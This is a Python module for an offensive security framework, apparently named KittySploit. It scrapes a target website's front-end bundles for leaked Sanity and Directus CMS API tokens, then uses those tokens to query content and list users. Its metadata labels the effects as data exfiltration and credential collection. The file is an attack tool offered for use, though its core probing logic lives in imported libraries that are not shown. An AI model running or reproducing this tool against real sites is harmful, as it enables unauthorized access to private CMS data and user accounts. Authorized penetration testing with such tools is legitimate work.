#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Abuse leaked Sanity and Directus API tokens."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.headless_cms_probe import enumerate_headless_cms
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Sanity / Directus Token Abuse",
        "description": (
            "Uses leaked Sanity sk* tokens for GROQ queries and Directus static tokens "
            "to list users. Auto-discovers credentials from SPA bundles."
        ),
        "author": ["KittySploit Team"],
        "tags": ["sanity", "directus", "cms", "headless", "enumeration", "auxiliary"],
        "modules": [
            "scanner/http/sanity_studio_detect",
            "scanner/http/directus_detect",
            "scanner/http/vibe_stack_secrets_detect",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 5,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.2,
        },
    }

    sanity_project_id = OptString("", "Sanity project ID", False)
    sanity_token = OptString("", "Sanity API token (sk…)", False)
    sanity_dataset = OptString("production", "Sanity dataset", False)
    directus_url = OptString("", "Directus base URL", False)
    directus_token = OptString("", "Directus static token", False)
    auto_discover = OptBool(True, "Scrape SPA for Sanity/Directus credentials", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")

        self._configure_session()
        target = str(self.target or "").strip()
        findings, creds = enumerate_headless_cms(
            self.session,
            homepage,
            verify_ssl=self._to_bool(self.verify_ssl),
            target_base=f"https://{target}" if target else "",
            sanity_project=str(self.sanity_project_id or "").strip(),
            sanity_token=str(self.sanity_token or "").strip(),
            sanity_dataset=str(self.sanity_dataset or "production").strip(),
            directus_url=str(self.directus_url or "").strip(),
            directus_token=str(self.directus_token or "").strip(),
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No Sanity/Directus API access (set options or enable auto_discover)")
            return False

        for hit in ok:
            print_success(f"{hit.get('platform')} {hit.get('kind')}")

        self.set_info(
            severity="critical",
            reason=f"Headless CMS token abuse: {', '.join(sorted({str(h.get('platform')) for h in ok}))}",
            findings=findings,
            credentials={k: mask_secret(v) if "token" in k else v for k, v in creds.items()},
        )
        return True
